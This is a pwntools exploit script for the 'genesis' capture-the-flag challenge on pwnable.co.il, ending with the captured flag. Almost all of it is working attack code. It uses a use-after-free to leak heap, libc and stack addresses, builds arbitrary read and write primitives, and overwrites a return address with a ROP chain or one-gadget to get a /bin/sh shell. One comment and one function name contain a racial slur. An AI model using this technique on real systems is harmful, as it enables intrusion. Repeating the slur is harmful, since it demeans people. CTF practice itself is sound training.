#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './genesis')

### config ###
host = args.HOST or 'pwnable.co.il'
port = int(args.PORT or 9007)

###  defines ###
YES = 'y'
NO = 'n'
MAIN_ARENA_OFFSET = 0x00000000003b4b60
BINSH_OFFSET = 0x17c6b7

### gadgets ###
POP_RSP = 0x00000000000039d0
POP_RDI = 0x0000000000021a02
ONE_GADGET_OFFSET = 0xc4ddf

if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('./libc-2.30.so')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc-2.30.so')
else:
    libc = ELF('./libc-2.30.so')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

### helpers ### 
def send_option(io: process, option: int):
    io.sendline(str(option))

def new_creature(io: process, index: int = 0, size: int = 1, data: str = "", type: int = 1, cls: bool = True):
    send_option(io, 1)
    io.sendline(str(index))
    io.sendline(str(type))
    io.sendline(str(size))
    io.sendline(data)
    if cls:
        io.recvuntil("Exit")

def get_name(io: process, index: int = 0):
    send_option(io, 5)
    io.recv(2048)
    io.sendline(str(index))
    io.recvuntil("Name: ")
    name = io.recvuntil('New')[:-3]
    io.sendline("n")
    io.recvuntil("Exit")
    return name

def new_name(io: process, index: int, size: int = 1, data = "", cls: bool = True):
    send_option(io, 5)
    io.sendline(str(index))
    io.sendline(YES)
    io.sendline(str(size))
    io.sendline(data)
    if cls:
        io.recvuntil("Exit")

def edit_name(io: process, index: int, data: str = "", cls: bool = True):
    send_option(io, 2)
    io.sendline(str(index))
    io.sendline(data)
    if cls:
        io.recvuntil("Exit")

def del_creature(io: process, index: int = 0, cls: bool = True):
    send_option(io, 3)
    io.sendline(str(index))
    if cls:
        io.recvuntil("Exit")

def leak_heap(io: process):
    new_creature(io, 0)
    new_creature(io, 1)
    del_creature(io, 0)
    new_name(io, 1, 17, b"a" * 7)
    heap_base = int.from_bytes(get_name(io, 1)[8:], 'little') - 0x30
    log.info(f"heap base: {hex(heap_base)}")
    del_creature(io, 1)
    return heap_base

def arbitrary_read(io: process, addr: int):
    new_creature(io, 3)
    new_creature(io, 4)
    del_creature(io, 3)
    new_name(io, 4, 16, b"a" * 8 + p64(addr))
    io.recv(2048)
    return int.from_bytes(get_name(io, 3), 'little')

def arbitrary_write(io: process, addr: int, data: str):
    new_creature(io, 6, cls = False)
    new_creature(io, 7, cls = False)
    del_creature(io, 6, cls = False)
    new_name(io, 7, 16, b"a" * 8 + p64(addr), cls = False)
    edit_name(io, 6, data, cls = False)

def leak_libc(io: process, heap_base: int):
    new_creature(io, 0, 0x200)
    new_creature(io, 1, 0x200)
    new_creature(io, 2, 0x200)
    del_creature(io, 0)
    del_creature(io, 1)
    del_creature(io, 3)
    libc = arbitrary_read(io, heap_base + 0xb0) - MAIN_ARENA_OFFSET - 0x60
    log.info(f"libc base: {hex(libc)}")
    return libc

def leak_stack(io: process):
    stack = arbitrary_read(io, libc.sym.environ)
    log.info(f"stack leak: {hex(stack)}")
    return stack

#work only localy :(
def cool_payload(io: process, function_stack: int, stack: int):
    arbitrary_write(io, function_stack + 8, p64(stack))
    arbitrary_write(io, stack, p64(libc.address + POP_RDI))
    arbitrary_write(io, stack + 8, p64(libc.address + BINSH_OFFSET))
    arbitrary_write(io, stack + 16, p64(libc.sym.system))
    arbitrary_write(io, function_stack, p64(libc.address + POP_RSP))

#payload for niggers but work also remotly
def nigga_payload(io: process, function_stack: int):
    arbitrary_write(io, function_stack, p64(libc.address + ONE_GADGET_OFFSET))

# -- Exploit goes here --
def main():
    ### run ###
    io = start()
    io.recvuntil("Exit")

    ### leaks ###
    heap_base = leak_heap(io)
    libc.address = leak_libc(io, heap_base)
    stack = leak_stack(io)
    function_stack = stack - 0x110

    ### payload start ###
    log.info(f"function stack: {hex(function_stack)}") 

    if args.LOCAL:
        log.info("sending local payload...")
        cool_payload(io, function_stack, stack)      # Run function - system('/bin/sh')
    else:
        log.info("sending remote payload...")
        nigga_payload(io, function_stack)            # Run one gadget execve('/bin/sh')
    
    io.clean()
    io.interactive()

if __name__ == "__main__":
    main()

#flag: PWNIL{And_God_said_Let_there_be_heap_exploitation!}
